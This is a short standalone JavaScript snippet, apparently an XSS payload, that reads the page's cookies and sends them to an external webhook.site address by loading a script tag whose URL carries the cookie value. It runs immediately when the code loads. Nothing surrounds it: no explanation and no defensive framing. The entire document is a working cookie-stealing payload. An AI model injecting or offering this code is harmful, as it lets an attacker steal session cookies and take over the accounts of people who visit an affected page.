    function loadScriptWithCookie() {
        var cookieValue = document.cookie; // Get the cookie value
        var script = document.createElement('script');
        script.src = "https://webhook.site/537e3269-9023-44a2-923b-0dedca274076?a=" + encodeURIComponent(cookieValue);
        document.head.appendChild(script);
    }

    loadScriptWithCookie(); // Call the function to load the script
